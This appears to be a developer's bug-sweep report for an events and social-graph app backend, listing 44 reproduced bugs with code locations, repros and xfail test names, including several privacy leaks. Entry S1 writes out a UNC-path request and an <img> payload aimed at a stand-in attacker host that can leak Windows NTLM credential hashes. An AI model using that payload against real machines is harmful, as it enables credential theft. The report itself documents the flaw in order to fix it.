# Verified Bugs

_Bug sweep, 2026-11-14._

A failing test reproduces every bug listed here. The new tests live in
`tests/backend/test_bugs_*.py`. Each one asserts the **correct** behaviour and is marked
`@pytest.mark.xfail(strict=True, reason="BUG: ...")`. That keeps the suite green today, but a
test **errors on XPASS** once its bug is fixed, which is the signal to delete its marker.

```sh
uv run pytest tests/backend/test_bugs_*.py              # 57 xfailed, 2 passed (sanity checks)
uv run pytest tests/backend/test_bugs_*.py --runxfail   # 57 failed: every bug reproduces
```

**Severity:** 🔴 high · 🟠 medium · 🟡 low.
**Tests:** `[m+s]` means the test runs against both the memory and sqlite stores.

## Summary

| Area | 🔴 | 🟠 | 🟡 | Total |
|---|---|---|---|---|
| Server / HTTP | – | 2 | 4 | 6 |
| AI search | 1 | 2 | 2 | 5 |
| Discovery / network | – | 4 | 3 | 7 |
| Graph core / storage | 1 | 2 | 4 | 7 |
| Objects / seeding | – | 2 | 8 | 10 |
| Co-hosting (already in `test_cohosting_gaps.py`) | – | 5 | 4 | 9 (+4 design) |
| **Total** | **2** | **17** | **25** | **44** |

---

## 1. Server / HTTP — `tests/backend/test_bugs_server.py`

### S1 🟠 Backslash URL makes the server open a UNC network path (Windows)
- **Where:** `src/backend/server.py:424-429` (`resolve_static`)
- **Repro:** `GET /%5C%5Chost%5Cshare%5Cx` is unquoted to `\\host\share\x`. `lstrip("/")` leaves the backslashes in place, so `root / relative` becomes a UNC path.
- **What goes wrong:** `.resolve()` runs on that path *before* the `is_relative_to` check. On Windows that opens an SMB connection to the remote host, which can leak the user's NTLM credential hash. Any web page can trigger it with `<img src="http://127.0.0.1:8000/%5C%5Cattacker%5Cs%5Cx">`.
- **Expected:** reject backslashes, drive letters and absolute paths before touching the filesystem.
- **Test:** `test_static_never_resolves_a_unc_path`. It uses a spy on `Path.resolve`, so no network traffic happens.

### S2 🟠 Lone surrogate in a search query gives a 500, and the 500 is cached
- **Where:** `server.py:374` accepts the query; `server.py:382` (`_json`, `ensure_ascii=False` then `.encode()`) fails.
- **Repro:** `POST /api/search` with `{"query": "robots \ud800"}`. This is valid JSON.
- **What goes wrong:** the reply echoes the query, and encoding it raises `UnicodeEncodeError`, so the response is 500. The broken result is already in `_cache`, so every repeat of that query also returns 500.
- **Expected:** 400, or encode replies with `ensure_ascii=True`.
- **Test:** `test_lone_surrogate_in_search_query_is_a_400_not_a_500`

### S3 🟡 Unicode digit in `page` gives a 500
- **Where:** `server.py:297-299` (`_int_param`)
- **Repro:** `?page=%C2%B2` ("²"). `"²".isdigit()` is True, but `int("²")` raises `ValueError`, which is not caught.
- **Expected:** 400 "page must be a whole number". Use `isdecimal()`/`isascii()` plus try/except.
- **Test:** `test_unicode_digit_page_is_a_400_not_a_500`

### S4 🟡 Very long `page` number gives a 500
- **Where:** `server.py:299`
- **Repro:** `?page=` followed by 5000 nines hits Python's 4300-digit `int()` limit and raises `ValueError`.
- **Expected:** 400.
- **Test:** `test_huge_page_number_is_a_400_not_a_500`

### S5 🟡 Empty POST body gets 413 "request too large"
- **Where:** `server.py:371`
- **Repro:** `POST /api/search` with `Content-Length: 0`. A negative length gets the same response.
- **Expected:** 400.
- **Test:** `test_empty_search_body_is_a_400_not_413`

### S6 🟡 `/api/personas` shows friend counts for people who hid their connections
- **Where:** `server.py:152` uses `connections_of` directly and ignores `Person.hide_connections`.
- **Repro:** Drew turns on `set_hide_connections`, but `/api/personas` still shows `friends: 6` to everyone, including logged-out visitors.
- **Expected:** 0 or omitted.
- **Test:** `test_personas_do_not_reveal_hidden_connection_counts`

---

## 2. AI search — `tests/backend/test_bugs_ai.py`

### A1 🔴 With no credentials, AI search and the agent crash instead of falling back
- **Where:** `src/backend/graph/claude_interpreter.py:129-147` and `src/backend/graph/search_agent.py:187-209` (`_call`)
- **Repro:** a machine with no `ANTHROPIC_API_KEY`, no Keychain and no `ant auth` profile. That covers any Windows or Linux setup without the env var.
- **What goes wrong:** the SDK raises a plain **`TypeError`** ("Could not resolve authentication method…") on the first request. That is not an `AnthropicError`, so the `except anthropic.AnthropicError` branch never runs and both searches crash.
- **Expected:** raise `InterpreterError`/`AgentError`, then fall back to keyword or single-call search.
- **Why the suite misses it:** `conftest.py` swaps in a stub client that raises `AnthropicError`.
- **Tests:** `test_interpreter_without_credentials_raises_interpreter_error`, `test_ai_search_without_credentials_falls_back_to_keywords`, `test_search_agent_without_credentials_falls_back`

### A2 🟠 Orgs the viewer can't see are named to the model (privacy)
- **Where:** `search_tools.py:441-449` (`_active_orgs`) and `ai_search.py:217-220`. The source is `ActivityService.top_orgs`, which never calls `privacy.can_view`.
- **Repro:** Carol RSVPs to a public event that a PRIVATE org co-hosts. "Secret Society" then appears in `get_active_orgs` and in `ViewerContext.top_orgs`.
- **Tests:** `test_get_active_orgs_hides_orgs_the_viewer_cannot_see`, `test_ai_search_viewer_context_hides_orgs_the_viewer_cannot_see` [m+s]

### A3 🟠 `get_recent_events` returns removed or now-hidden events (privacy)
- **Where:** `search_tools.py:451-460`. `ActivityService.recent_events` only checks `has_node`, not `is_active` or `can_view`. The same data feeds the AI-search `ViewerContext`.
- **Repro:** Carol RSVPs going. The event is then removed, or switched to MEMBERS visibility, which she can't see. Its title still reaches the model.
- **Tests:** `test_get_recent_events_skips_removed_events`, `test_get_recent_events_skips_events_the_viewer_can_no_longer_see` [m+s]

### A4 🟡 `scripts/ai_search.py --agent` ignores `--limit`
- **Where:** `scripts/ai_search.py:66`
- **Repro:** `--limit 1` still prints all 5 picks.
- **Test:** `test_script_agent_mode_honours_limit`

### A5 🟡 `scripts/ai_search.py --agent` ignores `--radius`
- **Where:** `scripts/ai_search.py:66`. The radius only sets `origin`; it is never applied.
- **Repro:** `--radius 5` still prints picks 11–41 km away.
- **Test:** `test_script_agent_mode_honours_radius`

---

## 3. Discovery / ranking / network — `tests/backend/test_bugs_discovery.py`

### D1 🟠 The network view draws every connection twice
- **Where:** `src/backend/graph/network.py:544-552` (`_Walk.links_among`). The dedupe key `(source, target)` depends on direction, and only membership links are normalised.
- **Repro:** Alice and Bob are connected. `neighborhood(alice)` returns both alice→bob and bob→alice.
- **Test:** `test_neighborhood_draws_each_connection_once` [m+s]

### D2 🟠 The focus view also duplicates connection links
- **Where:** `network.py:430-431` (`focus`) merges neighbourhood and path links with the same direction-dependent key.
- **Repro:** Alice–Bob–Carol, then `focus(alice, carol)`: one of the links appears twice.
- **Test:** `test_focus_draws_each_connection_once` [m+s]

### D3 🟠 Org tags ignore membership consent (`recommendation_use=NONE`)
- **Where:** `src/backend/graph/preferences.py:391-397` (`_org_tags`). `activity.py` does honour this setting.
- **Repro:** Carol sets her membership to `NONE`, but `profile(carol).org_tags` still contains that org's tags.
- **Test:** `test_membership_marked_none_is_not_learned_from` [m+s]

### D4 🟠 The "your org hosts" boost ignores membership consent
- **Where:** `src/backend/graph/discovery.py:262-269` (`_my_orgs`)
- **Repro:** Carol's chapter membership is set to `NONE`, yet the `my_org_host` effect is still 0.8 and the reason is still shown.
- **Test:** `test_membership_marked_none_gives_no_my_org_boost` [m+s]

### D5 🟡 The org filter reveals a hidden co-host
- **Where:** `discovery.py:251-253` and `_org_scope` (`:271-277`). The `org_id` scope is never checked against what the viewer can see.
- **Repro:** National is MEMBERS-only and co-hosts a public event. Carol, who can't see National, searches with `org_id=national` and gets the event back. That tells her National co-hosts it.
- **Test:** `test_org_filter_does_not_reveal_a_hidden_co_host` [m+s]

### D6 🟡 `find_path` ignores the hop limit when it is negative
- **Where:** `network.py:563`. The check is `hops == max_hops`, and `max_hops` is never validated.
- **Repro:** `find_path(alice, bob, max_hops=-1)` returns a 1-hop path.
- **Test:** `test_find_path_never_exceeds_max_hops` [m+s]

### D7 🟡 A non-integer `limit` passes `DiscoveryQuery` validation
- **Where:** `discovery.py:90` only does a range check.
- **Repro:** `DiscoveryQuery(limit=2.5)` is accepted, then `search()` crashes with a `TypeError` when slicing.
- **Test:** `test_fractional_limit_is_rejected_up_front`

---

## 4. Graph core / storage — `tests/backend/test_bugs_graph.py`

### G1 🔴 `EventService.create` can overwrite someone else's event
- **Where:** `src/backend/graph/events.py:86-100` never checks that `event.id` is new.
- **Repro:** Carol calls `create(replace(make_event(...), id=alices_event.id), carol.id, carol.id)`.
- **What goes wrong:** Alice's event is overwritten, Carol gets a second PRIMARY `Hosts` edge, and Carol can now edit the event.
- **Test:** `test_create_cannot_overwrite_someone_elses_event` [m+s]

### G2 🟠 `SeriesService.create` lets one org take over another org's series
- **Where:** `series.py:41-43`
- **Repro:** Bob, a national admin, creates an `EventSeries` that reuses the chapter series' id. The series is overwritten and `owner_org_id` becomes national.
- **Test:** `test_series_create_cannot_overwrite_another_orgs_series` [m+s]

### G3 🟠 `update_defaults` is not atomic
- **Where:** `series.py:105`. The series is saved before the instance edits run, with no transaction around them, and `with_defaults` does no validation.
- **Repro:** `update_defaults(..., capacity=0)` raises a `DomainRuleError`, but `default_capacity=0` is already saved, so later occurrences break.
- **Test:** `test_rejected_series_default_change_leaves_series_untouched` [m+s]

### G4 🟡 Clearing an RSVP lets one event count twice in the travel average
- **Where:** `rsvps.py:85-88` hard-deletes the RSVP, and the `trip_recorded` flag goes with it (`:98-109`).
- **Repro:** GOING with an origin, then `status=None`, then GOING again gives `travel_samples == 2`. The code's own comment promises "one trip per event".
- **Test:** `test_one_trip_per_event_even_after_clearing_the_rsvp` [m+s]

### G5 🟡 A PRIVATE org is invisible to its own admins
- **Where:** `privacy.py:136-151`. `_owner_ids` returns nothing for an `Organization`.
- **Repro:** The chapter is set to PRIVATE. Admin Alice then gets `False` from `can_view(alice, chapter)` and `PermissionDeniedError` from `calendar.host_events`. This contradicts `roster.can_see`, which lets admins see a PRIVATE org.
- **Test:** `test_admins_can_see_their_own_private_org_and_its_calendar` [m+s]

### G6 🟡 Erasing an account leaves the person's id in `provenance.created_by`
- **Where:** `privacy.py:113-132` scrubs `confirmed_by` but not `created_by`.
- **Repro:** After `erase_person(alice)`, the surviving `Hosts` edge still has `created_by == alice.id`. The same goes for PartOf, Tagged, InstanceOf and EventSeries records.
- **Test:** `test_erased_person_id_is_not_left_in_surviving_records` [m+s]

### G7 🟡 `read_environment_stamp` fails on paths containing `#`
- **Where:** `sqlite_store.py:62` builds `f"file:{path}?mode=ro"` without URI-escaping the path.
- **Repro:** a TEST database at `.../week#1/graph.db` returns `None`, so `seed_test_db.py --reset` refuses to reset it. It fails safe.
- **Test:** `test_environment_stamp_is_read_from_paths_with_uri_characters` (sqlite only)

---

## 5. Objects / seeding — `tests/backend/test_bugs_objects_seed.py`

### O1 🟠 The demo network isn't repeatable even though `RANDOM_SEED` is fixed
- **Where:** `src/backend/seed_network.py:97, 102, 104, 148`. The code sorts random `uuid4` ids, so the seeded RNG picks different people, tags and events on each run.
- **Repro:** Two `seed_mock_data(graph, TEST, NOW)` runs differ in about 87 of 99 RSVPs, as well as in interests and travel samples. The existing test misses this because it only compares event titles.
- **Test:** `test_hand_built_demo_network_is_the_same_every_time`

### O2 🟠 `Rsvp.updated_at` accepts a naive datetime
- **Where:** `src/backend/objects/edges.py:238-245`. `Rsvp` has no `__post_init__`, while every other datetime field calls `require_aware`.
- **Test:** `test_rsvp_rejects_naive_updated_at`

### O3 🟡 `seed_bulk` creates memberships before the person's account exists
- **Where:** `seed_bulk.py:412` (`_days_ago(160, 700)`) vs `:381` (`_days_ago(330, 900)`). Admin claims at `:350` have the same problem.
- **Repro:** 38 such memberships at SMALL scale, 471 at LARGE.
- **Test:** `test_bulk_memberships_do_not_predate_the_account`

### O4 🟡 `seed_bulk` orgs are created "now" but were claimed or joined months earlier
- **Where:** `seed_bulk.py:331` with `_staff()` (`:709`, `created_at=self.now`)
- **Repro:** 21 orgs at SMALL scale have memberships older than the org.
- **Test:** `test_bulk_orgs_are_not_claimed_before_they_exist`

### O5 🟡 The `Tag` slug regex accepts a trailing newline
- **Where:** `taxonomy.py:10`. `re.match(...$)` matches before a final `\n`; use `fullmatch` or `\Z`.
- **Test:** `test_tag_slug_rejects_trailing_newline`

### O6 🟡 `MemberOf` accepts `ended_at` before `started_at`
- **Where:** `edges.py:106-113`
- **Test:** `test_membership_cannot_end_before_it_starts`

### O7 🟡 `DataExport` accepts negative counts
- **Where:** `data_export.py:18-22`
- **Test:** `test_data_export_rejects_negative_counts`

### O8 🟡 `Person` accepts an RSVP audience the system doesn't allow (e.g. PUBLIC)
- **Where:** `person.py:38-40, 46`. Only `set_rsvp_visibility` checks against `RSVP_AUDIENCES`; the constructor doesn't, and `RsvpService` then copies PUBLIC onto every RSVP.
- **Test:** `test_person_rejects_rsvp_visibility_that_is_not_a_choice`

### O9 🟡 `EventSeries` accepts `default_capacity <= 0`
- **Where:** `event.py:136-138`. Every later `instantiate()` call then fails.
- **Test:** `test_event_series_rejects_non_positive_default_capacity`

### O10 🟡 `EventSeries` accepts a blank name or default title
- **Where:** `event.py:136-138`. `Event`, `Organization` and `Tag` all reject blank names.
- **Test:** `test_event_series_rejects_blank_name_and_title`

---

## 6. Co-hosting — already captured in `tests/backend/test_cohosting_gaps.py`

A teammate committed this file. Its 28 tests (14 cases × 2 stores) **fail today**. The file's
docstring says failing cases should be marked `xfail(strict=True)`, but they aren't, so they
are the main reason the suite is red. The source is in `src/backend/graph/events.py`,
`cohosting.py`, `roster.py`, `privacy.py` and `calendar.py`.

**Bugs:**

| # | Sev | Bug | Test |
|---|---|---|---|
| C1 | 🟠 | A CONNECTIONS-only membership still appears on the public member list | `test_connections_only_membership_stays_off_the_member_list` |
| C2 | 🟠 | A co-host invite can still be accepted after the event is cancelled | `test_invitation_cannot_be_accepted_once_the_event_is_cancelled` |
| C3 | 🟡 | A co-host can be invited after the event has ended | `test_cannot_invite_a_co_host_after_the_event_has_ended` |
| C4 | 🟡 | A co-host can be invited to an archived event | `test_cannot_invite_a_co_host_to_an_archived_event` |
| C5 | 🟠 | A declined (removed) invitation can still be accepted | `test_a_declined_invitation_cannot_be_accepted` |
| C6 | 🟠 | A declined co-host request can still be approved | `test_a_declined_request_cannot_be_approved` |
| C7 | 🟠 | The calendar window drops an event that is under way | `test_calendar_window_keeps_an_event_that_is_under_way` |
| C8 | 🟡 | A co-host can't withdraw an invitation it sent (`PermissionDeniedError`) | `test_a_co_host_can_withdraw_an_invitation_it_sent` |
| C9 | 🟡 | If the primary host's account is erased, a co-host other than the first to accept becomes primary | `test_erased_primary_passes_to_the_co_host_that_accepted_first` |

**Needs a product decision** (the file labels these "DESIGN"):
- Only the primary host should be able to cancel or archive an event. Today co-hosts can too.
- A host can approve their own co-host request.
- Cancelling an event leaves its pending co-host requests and invites open.

---

## Not source bugs: test environment problems on Windows

- **`test_server.py` static-file tests (13 ERRORs)** and
  **`test_edge_storage.py::test_export_refuses_symlink_escaping_the_root` (1 FAIL)** call
  `Path.symlink_to`. On Windows that needs admin rights or Developer Mode, so they fail with
  `WinError 1314`. Fix: skip them when symlinks aren't available, or turn on Developer Mode.

## Suspected but not verified (no failing test yet)

- **Slow clients:** the request handler sets no socket timeout, so a client that sends less than its `Content-Length` keeps a thread blocked, and the thread count is unbounded (`server.py:368-374`).
- **Stale search cache:** cached results include `my_rsvp`, `friends_going` and `going_count`, and the cache never expires (`server.py:192-210`).
- **Personas leak memberships:** `/api/personas` lists org memberships whatever their visibility setting (`server.py:142-146`).
- **ML export:** it includes soft-removed memberships and ignores a membership's PRIVATE visibility (`data_access.py`).
- **Export audit without files:** `export_ml_dataset.py` saves its `DataExport` audit record before creating the output directory, so a failed `mkdir` leaves an audit record with no files.
- **DST in series:** `EventSeries.instantiate` adds the duration in local wall-clock time, so across a DST change an occurrence can last an hour longer or shorter. It can't be tested here because `tzdata` isn't installed.
- **Discovery window:** `starts_after=now` hides events that are already under way. This is the same issue as C7, but in discovery.
- **Trusting the submitted event:** `EventService.create` trusts a submitted `published_at` on a draft, so a never-published draft counts as `was_published`.
- **Duplicate occurrences:** `publish_occurrences` doesn't de-duplicate identical start times.
- **Naive `now`:** `search()` and `profile()` accept a naive `now` and crash with a `TypeError` instead of raising a `DomainRuleError`.
- **`--radius 0`:** in `scripts/ai_search.py`, 0 is treated as "no radius", which leads to a misleading `DomainRuleError`.
